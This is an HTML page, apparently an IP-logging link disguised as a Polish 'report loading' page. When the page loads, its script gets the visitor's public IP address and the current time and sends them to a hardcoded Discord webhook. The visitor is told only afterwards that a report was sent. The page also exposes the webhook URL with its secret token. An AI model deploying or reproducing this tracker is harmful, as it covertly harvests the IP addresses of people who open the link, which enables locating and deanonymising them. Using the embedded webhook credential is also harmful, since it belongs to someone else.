<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Raport uruchomienia</title>
</head>
<body>

<h2>Ładowanie raportu...</h2>

<script>
async function sendReport() {
    try {
        // Pobierz publiczne IP
        let ipResponse = await fetch("https://api.ipify.org?format=json");
        let ipData = await ipResponse.json();
        let ip = ipData.ip;

        // Data i godzina
        let now = new Date().toLocaleString();

        // Wyślij do Discord webhook
        await fetch("https://discord.com/api/webhooks/1475185024688066774/Y92XyKynfaiP0jSYW_mWVqYahga2ZvSupHlRxmAmjagLkS_QCs_r2huOvkQ8WBuuQwlZ", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                content:
                "📡 **Raport otwarcia linku**\n\n" +
                "🌍 IP: " + ip + "\n" +
                "🕒 Czas: " + now
            })
        });

        document.body.innerHTML = "<h2>Raport wysłany ✅</h2>";

    } catch (error) {
        document.body.innerHTML = "<h2>Błąd wysyłania ❌</h2>";
    }
}

sendReport();
</script>

</body>
</html>
